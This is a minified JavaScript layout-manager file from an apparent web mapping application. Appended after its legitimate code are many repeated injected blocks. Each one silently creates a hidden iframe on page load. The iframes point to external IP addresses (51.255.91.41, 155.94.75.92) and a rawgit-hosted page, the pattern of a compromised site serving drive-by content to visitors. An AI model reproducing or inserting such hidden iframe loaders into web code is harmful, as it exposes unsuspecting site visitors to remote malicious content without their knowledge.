this.mobileController.placeAt(this.mapId)),this.onOnScreenWidgetChange(a,b))},onOnScreenGroupsChange:function(a){this.appConfig=a;this._createLayout(!0,!1)},onGroupChange:function(a,c){this.appConfig=a;c=a.getConfigElementById(c.id);c.isOnScreen?this._createLayout(!0,!1):(b.forEach(this.widgetManager.getControllerWidgets(),function(d){d.isControlled(c.id)&&this.reloadControllerWidget(a,d.id)},this),b.forEach(this.panelManager.panels,function(a){a.config.id===c.id&&a.updateConfig(c)},this))},_reArrangeWidgetsLayout:function(a){a&&
this._destroyOnScreenWidgets();window.appInfo.isRunInMobile?(a&&this._loadMobileOnScreenWidgets(),this.mobilePanel.setPanels(this.dashboardWidgets,this.dashboardPanels)):(a&&this.loadOnScreenWidgets(this.appConfig),this._reArrangeWidgetsInDesktopLayout())},_reArrangeWidgetsInDesktopLayout:function(){b.forEach(this.appConfig.widgetOnScreen.groups,a.hitch(this,function(d){d=this.appConfig.getConfigElementById(d.id);var c=this._findContentItemById(d.id,"stack");c&&b.forEach(d.widgets,a.hitch(this,function(a,
d){var b={id:a.id,type:"component",title:a.label,componentName:"widget panel",componentState:{widgetId:a.id}};c.contentItems.length>d?(d=c.contentItems[d],d.config.id=a.id,d.config.title=a.label,d.config.componentState={widgetId:a.id},d.setTitle(a.label),c.setActiveContentItem(d)):c.addChild(b)}))}))},_loadMobileOnScreenWidgets:function(){this.mobileController=new v({appConfig:this.appConfig,panelContainerNode:this.mobilePanel.widgetContainerNode});this.mobileController.placeAt(this.mapId);b.forEach(this.appConfig.widgetOnScreen.widgets,
function(a){a.uri&&a.visible&&!a.closeable&&this.loadOnScreenWidget(a,this.appConfig)},this)},_loadMobilePanel:function(d,b){var c=this.appConfig.layoutDefinition.mobileLayout.panel,e=new k;q([c.uri],a.hitch(this,function(c){this.mobilePanel=new c({layoutId:this.layoutId,mapId:this.mapId,mobileLayout:b,config:{},layoutManager:this});this.own(p(this.mobilePanel,"resized",u(a.hitch(this,function(a){this.mobileController&&this.mobileController.setPanelPosition(a)}),200)));f.place(this.mobilePanel.domNode,
d);e.resolve()}));return e},_loadDashboardWidget:function(d){var c=new k,f=this.dashboardPanels[d];if(f&&f.domNode)return c.resolve(this.dashboardPanels[d]),c;var g;b.some(this.appConfig.widgetOnScreen.groups,a.hitch(this,function(c){return b.some(c.widgets,a.hitch(this,function(a){if(a.id===d)return g=a,!0}))}));if(!g)return c.resolve(null),c;var h=this.appConfig.layoutDefinition.layout.panel;q([h.uri],a.hitch(this,function(b){var e={config:g,uri:h.uri,map:this.map,widgetManager:this.widgetManager,
panelManager:this.panelManager,id:d+"_panel",position:{}},f;a.mixin(e,g.options);try{f=new b(e),this.dashboardPanels[d]=f,c.resolve(f),console.log("panel ["+e.id+"] created.")}catch(z){console.log("create panel error: "+z+", panelId: "+e.id),c.reject(z)}}));return c},onLayoutDefinitionChange:function(a){this.appConfig=a;this._createLayout(!1,!1)},onLayoutChange:function(d){var c=window.appInfo.isRunInMobile,f=!1;this.isEditing||(c!==this._isLastLayoutMobile&&(f=!0,this._isLastLayoutMobile=c),this.appConfig=
d,this._createLayout(!1,f).then(a.hitch(this,function(){b.forEach(this.widgetPlaceholders,function(a){a.moveTo(d.getConfigElementById(a.configId).position)},this);b.forEach(this.onScreenWidgetIcons,function(a){a.moveTo(d.getConfigElementById(a.configId).position)},this);b.forEach(this.widgetManager.getOnScreenOffPanelWidgets(),function(a){if(!a.closeable){var b=d.getConfigElementById(a.id).position;a.setPosition(b)}},this)})))},openWidget:function(a){var b;(a=this._findContentItemById(a,"component"))&&
(b=a.parent)&&b.isStack&&b.setActiveContentItem(a)},_loadOnScreenGroups:function(){var d=this.appConfig.widgetOnScreen.groups,c=[],f=new k;b.forEach(d,a.hitch(this,function(a){a=this.appConfig.getConfigElementById(a.id);b.forEach(a.widgets,function(a){c.push(a.id)})}));b.forEach(this.dashboardWidgets,a.hitch(this,function(a){if(0>c.indexOf(a)){var b=this.dashboardPanels[a];b&&(this.panelManager.closePanel(b),b.destroy());this.dashboardPanels[a]=null}}));this.dashboardWidgets=c;f.resolve();return f},
_destroyOnScreenWidgets:function(){this.destroyOnScreenOffPanelWidgets();this.destroyWidgetPlaceholders();this.destroyOnScreenWidgetIcons();this.mobileController&&(this.mobileController.destroy(),this.mobileController=null)},_destroyOnScreenGroups:function(){b.forEach(this.dashboardWidgets,a.hitch(this,function(a){if(a=this.dashboardPanels[a])this.panelManager.closePanel(a),a.destroy(),a=null}));this.panelManager.destroyAllPanels();this.dashboardWidgets=[];this.dashboardPanels={};this.mobilePanel&&
this.mobilePanel.clearPanels()}});x.getInstance=function(a,b){null===w&&(w=new x(a,b),window._layoutManager=w);return w};return x});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});